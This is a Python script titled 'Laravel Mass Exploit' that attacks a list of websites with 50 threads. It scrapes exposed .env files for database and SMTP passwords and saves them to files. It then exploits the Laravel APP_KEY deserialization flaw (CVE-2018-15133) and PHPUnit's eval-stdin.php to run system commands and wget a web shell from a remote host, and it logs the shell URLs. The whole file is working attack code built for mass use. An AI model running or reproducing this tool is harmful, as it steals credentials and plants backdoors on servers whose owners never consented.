#Con7ext
import requests as tod
import re
from httplib import IncompleteRead
from subprocess import check_output
from termcolor import colored
from requests import HTTPError, Timeout, ConnectionError, TooManyRedirects
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
tod.packages.urllib3.disable_warnings(InsecureRequestWarning)
print("""
##################################
#      Laravel Mass Exploit      #
#      C0d3d By Marwan007        #
#      INSTA : mrwn.007          #
##################################
""")
print("[Note] "+ colored("Add Http(s) To List", "blue"))
lists = raw_input("[=] List Site: ")
p = [i.strip() for i in open(lists, "r").readlines()]
def save(name, cont):
  f = open(name, "a+")
  f.write(cont+"\n")
def exploit(site):
  try:
    r = tod.get(site + "/.env", verify=False, timeout=15)
    print("[=] " + colored(site, "blue"))
    try:
      if r.status_code == 200 and 'DB_HOST' in r.text:
        print("["+ colored("DATABASE", "green") +"]")
        ko = r.text.replace("\n", "##")
        dbh = re.findall("DB_HOST=(.*?)##", ko)[0]
        dbd = re.findall("DB_DATABASE=(.*?)##", ko)[0]
        dbu = re.findall("DB_USERNAME=(.*?)##", ko)[0]
        dbw = re.findall("DB_PASSWORD=(.*?)##", ko)[0]
        print("HOST: " + dbh)
        #print("PORT: " + dbp)
        print("USER: " + dbu)
        print("PASS: " + dbw)
        print("NAME: " + dbd)
        save("db.txt", site +"|"+dbh+"|"+dbu+"|"+dbw+"|"+dbd)
        if "MAIL_HOST" in r.text:
          mh = re.findall("MAIL_HOST=(.*?)##", ko)[0]
          mp = re.findall("MAIL_PORT=(.*?)##", ko)[0]
          mu = re.findall("MAIL_USERNAME=(.*?)##", ko)[0]
          mw = re.findall("MAIL_PASSWORD=(.*?)##", ko)[0]
          if mh == '':
            print("["+ colored("SMTP", "red") +"]")
          else:
            print("["+ colored("SMTP", "green") + "]")
            print("HOST: " + mh)
            print("PORT: " + mp)
            print("USER: " + mu)
            print("PASS: " + mw)
            save("smtp.txt", mh+"|"+mp+"|"+mu+"|"+mw)
        else:
          print("[" + colored("SMTP", "red") + "]")
        key = re.findall("APP_KEY=(.*?)##", ko)[0]
        if key == '':
          pass
        else:
          if "base64:" in key:
            key = key.replace("base64:", "")
          else:
            key = key
          pay1 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjIxOiJ1bmFtZSAtYTtlY2hvIENvbjdleHQiO30="
          pay2 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjcxOiJ3Z2V0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmMKb20vcmludG9kL3Rvb2xvbC9tYXN0ZXIvcGF5bG9hZC5waHAiO30="
          gen = check_output(["php", "bjir/gen.php", key,  pay1])
          gen2 = check_output(["php", "bjir/gen.php", key, pay2])
          code = re.findall("##(.*?)##", gen)[0]
          code2 = re.findall("##(.*?)##", gen2)[0]
          njir = tod.post(site, headers={"X-XSRF-TOKEN": code}, verify=False)
          if "Con7ext" in njir.text:
            cok = tod.post(site, headers={"X-XSRF-TOKEN": code2}, verify=False)
            shel = tod.get(site +"/payload.php", verify=False)
            if ">>" in shel.text and shel.status_code == 200:
              print("["+ colored("Unrealize RCE", "green") +"]")
              print("SHELL: "+ site +"/payload.php")
              save("unrealize-rce.txt", site+"/payload.php")
            else:
              print("["+ colored("Unrealize RCE", "yellow") +"]")
              print("Try Manual: CVE-2018-15133")
              print("unrealize-manual.txt", site)
          else:
            print("["+ colored("Unrealize RCE", "red") +"]")
      else:
        print("[" + colored("DATABASE", "red") +"]")
    except IndexError:
      print("["+ colored("ERROR", "red") +"]")
    koc = tod.get(site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", verify=False, timeout=15)
    if koc.status_code == 200:
      peylod = "<?php echo 'Con7ext#'.system('uname -a').'#'; ?>"
      peylod2 = "<?php echo 'ajg'.system('wget https://raw.githubusercontent.com/rintod/toolol/master/payload.php -O c.php'); ?>"
      ree = tod.post(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=peylod, verify=False)
      if 'Con7ext' in ree.text:
        bo = tod.post(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=peylod2, verify=False)
        cok = tod.get(site +"/vendor/phpunit/phpunit/src/Util/PHP/c.php", verify=False)
        if cok.status_code == 200 and '>>' in cok.text:
          pec = re.findall("Con7ext#(.*?)#", ree.text)[0]
          print("["+ colored("PHPUNIT", "green") +"]")
          print("UNAME: "+ pec)
          print("SHELL: "+ site +"/vendor/phpunit/phpunit/src/Util/PHP/c.php")
          save("phpunit.txt", site+"/vendor/phpunit/phpunit/src/Util/PHP/c.php")
        else:
          print("["+ colored("PHPUNIT", "yellow") +"]")
          print("Try Manual")
          save("phpunit-manual.txt", site)
      else:
        print("["+ colored("PHPUNIT", "red") +"]")
    else:
      print("["+ colored("PHPUNIT", "red") +"]")
  except (HTTPError, Timeout, ConnectionError, TooManyRedirects, IncompleteRead, Exception):
    print("[?] "+ site + " -> " + colored("Unknow Error", "yellow"))

dnn = Pool(50)
dnn.map(exploit, p)
dnn.close()
dnn.join()
